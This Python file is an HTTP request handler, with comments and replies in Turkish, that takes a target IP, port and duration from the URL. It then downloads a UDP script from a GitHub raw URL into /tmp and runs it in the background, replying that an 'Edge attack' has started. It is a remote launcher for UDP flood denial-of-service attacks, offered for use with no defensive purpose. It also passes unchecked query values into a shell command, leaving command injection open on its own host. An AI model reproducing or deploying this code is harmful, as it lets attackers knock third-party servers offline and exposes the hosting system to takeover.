from http.server import BaseHTTPRequestHandler
import subprocess
import urllib.parse

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # URL'den parametreleri al (ip, port, sure)
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        
        target = params.get('ip', [''])[0]
        port = params.get('port', ['80'])[0]
        duration = params.get('time', ['10'])[0]

        if target:
            # UDP Scriptini indir ve arkada çalıştır
            cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
            subprocess.Popen(cmd, shell=True)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"🚀 Edge Saldirisi Basladi: {target}".encode())
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Hata: IP lazim kanka.")
